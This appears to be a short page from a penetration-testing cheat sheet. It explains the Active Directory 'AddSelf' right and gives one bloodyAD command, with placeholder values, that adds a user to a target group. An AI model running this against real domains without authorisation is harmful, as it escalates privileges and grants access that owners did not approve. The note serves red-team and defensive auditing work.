# 'AddSelf' to a group

When a user has `AddSelf` rights, it has the privilege to add itself to the group.

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

To add we can do this:

{% code title="BloodyAD" overflow="wrap" %}
```bash
# installation
sudo apt install bloodyad

bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
```
{% endcode %}
